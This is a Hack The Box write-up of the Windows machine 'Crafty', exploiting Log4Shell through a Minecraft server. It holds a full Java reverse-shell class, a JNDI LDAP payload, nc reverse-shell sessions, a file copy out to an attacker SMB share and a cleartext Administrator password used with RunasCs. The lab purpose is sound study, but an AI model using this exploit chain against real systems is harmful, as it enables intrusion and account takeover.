---
layout: writeup
category: HTB
chall_description: https://app.hackthebox.com/machines/Crafty
points: 0
solves: 3398
tags: Windows Minecraft Log4j
date: 2024-06-15
comments: true
---

# Introduction
**Crafty** is a Windows easy difficulty box that features abusing an old version of the Minecraft Server, making it vulnerable to log4j attacks. We start by finding a subdomain named `play.crafty.htb`, which is used by the Minecraft Server to connect players to the server. After abusing the log4j-shell vulnerability, we get to execute commands as the `svc_minecraft` account; we get a shell as that account, that can read Minecraft's Server files. Here we find a plugin named `playercounter-1.0-SNAPSHOT.jar`, that, decompiling it using `jd-gui`, we get a password that's reused for the Administrator account. Let's just jump in.

# Enumeration
As always we start with the `nmap`:

```bash
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 10.10.11.249
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-15 15:57 CEST
Initiating SYN Stealth Scan at 15:57
Scanning 10.10.11.249 [65535 ports]
Discovered open port 80/tcp on 10.10.11.249
Discovered open port 25565/tcp on 10.10.11.249
Completed SYN Stealth Scan at 15:58, 39.63s elapsed (65535 total ports)
Nmap scan report for 10.10.11.249
Host is up, received user-set (0.059s latency).
Scanned at 2024-06-15 15:57:40 CEST for 39s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
80/tcp    open  http      syn-ack ttl 127
25565/tcp open  minecraft syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.70 seconds
           Raw packets sent: 196631 (8.652MB) | Rcvd: 29 (1.276KB)
```

We only get two ports open, 80 (for web service, probably IIS) and 25565 (the minecraft server default port). Knowing this, we guess that's a server hosting a Minecraft Server that players can connect to and play the game. 

## HTTP - 80/tcp
Taking a look at the website, we just get a static web talking about its services:

![web](/assets/images/Crafty/1.png)

# Foothold - shell as `svc_minecraft`
Here we can notice the `play` subdomain, so we'll add that into our `/etc/hosts`. However, this is not a web domain; this is used by the backend of the Minecraft Server to allow connection for players. At this point of the box you could try to use the actual Minecraft game (which works), but I'll use [Minecraft Console Client](https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20240415-263/MinecraftClient-20240415-263-linux-x64). 
We will also clone the [log4j shell PoC](https://github.com/kozmer/log4j-shell-poc.git), in which we'll edit it to instead running `/bin/sh` it runs `cmd.exe` (since it's a Windows end). 
First we'll go to `log4j-shell-poc` and run the following command to install all the requirements:

```bash
pip3 install -r requirements.txt
```

Now we'll download [Corretto JDK8](https://corretto.aws/downloads/latest/amazon-corretto-8-x64-linux-jdk.tar.gz) and rename it to `jdk1.8.0_20`. When that's done, we have to edit the poc as I said before:

```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="cmd.exe"; // You have to change this 
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
```

Now that's all set, we'll run the python PoC:

```bash
❯ python3 poc.py --userip 10.10.14.124 --webport 8000 --lport 443

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.124:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389
```

Now run the Minecraft Console Client we donwloaded earlier:

```bash
Minecraft Console Client v1.20.4 - for MC 1.4.6 to 1.20.4 - Github.com/MCCTeam
GitHub build 263, built on 2024-04-15 from commit 403284c
Settings file MinecraftClient.ini has been generated.

MCC is running with default settings.
Password(invisible): 
You chose to run in offline mode.
Server IP : 
Retrieving Server Info...
Unexpected response from the server (is that a Minecraft server?)
Failed to ping this IP.
Server version : 
Restarting Minecraft Console Client...
Settings have been loaded from MinecraftClient.ini
You chose to run in offline mode.
Using Minecraft version 1.16.5 (protocol v754)
Downloading 'es_es.json' from Mojang servers...
Done. File saved as 'lang/es_es.json'
[MCC] Version is supported.
Logging in...
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type '/quit' to leave the server.
> ${jndi:ldap://10.10.14.124:1389/a}
```

Now, we should get a hit into our server, and a reverse shell into our nc listener:

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.124] from (UNKNOWN) [10.10.11.249] 49681
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server> whoami
crafty\svc_minecraft
c:\users\svc_minecraft\server>
```

# Privilege Escalation
With a shell on the box, we can poke around the Minecraft's files. We can see a directory named `plugins`, that contains a `.jar` file:

```bash
c:\Users\svc_minecraft\server\plugins> dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft\server\plugins

10/27/2023  02:48 PM    <DIR>          .
10/27/2023  02:48 PM    <DIR>          ..
10/27/2023  02:48 PM             9,996 playercounter-1.0-SNAPSHOT.jar
               1 File(s)          9,996 bytes
               2 Dir(s)   3,424,145,408 bytes free

c:\Users\svc_minecraft\server\plugins>
```

It's named `playercounter`, which makes me think it interacts with the webserver to calculate the number of joined players. 

![players](/assets/images/Crafty/2.png)

At the beginning I thought about editing the plugin, since it seems to interact with the webpage, to get a shell as the user that runs IIS (iisapppool), which usually has `SeImpersonatePrivilege` that will allow us to get `NT AUTHORITY SYSTEM`. However the privilege escalation is way easier, and we'll see later if the plugin interacts with the website or not when we pop up this box.
First of all, we'll bring that file into our attacker VM. After that, we can run `jd-gui` to decompile it. We need to follow these steps:

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support -username ruycr4ft -password ruycr4ft
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now we mount the share:

```bash
c:\Users\svc_minecraft\server\plugins>net use x: \\10.10.14.124\smbFolder /user:ruycr4ft ruycr4ft
The command completed successfully.
c:\Users\svc_minecraft\server\plugins>
```

And we copy the jar:

```bash
c:\Users\svc_minecraft\server\plugins>copy playercounter-1.0-SNAPSHOT.jar x:\
        1 file(s) copied.
c:\Users\svc_minecraft\server\plugins>
```

Then we need to run `sudo apt install jd-gui` and `jd-gui` to decompile the .jar file:

![jd-gui](/assets/images/Crafty/3.png)

Here we can appreciate a password. Since it's writing into `C:\inetput\wwwroot`, we can assume is a privileged account, so we can use [RunasCs](https://github.com/antonioCoco/RunasCs) to get a shell as Administrator:

```bash
c:\Users\svc_minecraft\Documents>copy x:\RunasCs.exe .
        1 file(s) copied.
c:\Users\svc_minecraft\Documents>
```

Now we trigger runas:

```bash
c:\Users\svc_minecraft\Documents>.\RunasCs.exe Administrator s67u84zKq8IXw powershell.exe -r 10.10.14.124:443
[+] Running in session 1 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4324 created in background.
c:\Users\svc_minecraft\Documents>
```

And finally, we are administrator:

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.124] from (UNKNOWN) [10.10.11.249] 49684
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
crafty\administrator
PS C:\Windows\system32> 
```

# Beyond root
As I mentioned before, let's check how the web is treating by running `type C:\inetpub\wwwroot\index.html`:

```html
...
		<div class="playercount">
			<p> Join <span> 1277 </span> other players on <span>play.crafty.htb</span></p>
		</div>
...
```

As we can see, the number of players is static, and there's no `playercount.txt` on that path as the jar plugin suggested.

```java
...
PrintWriter writer = new PrintWriter("C:\\inetpub\\wwwroot\\playercount.txt", "UTF-8");
...
```

So, we wouldn't be able to abuse the jar to get a shell as the account running IIS since it's just static and it basically does nothing.

# Conclusions
I hope you enjoyed the box, I definitely did. This box had such bad ratings because people thought you needed Minecraft to pwn it, but that's incorrect. Here I proved that you only need to download a release from github, and the box it's pretty stable, even though most players said it wasn't. Take care, and I'll see you all next time! 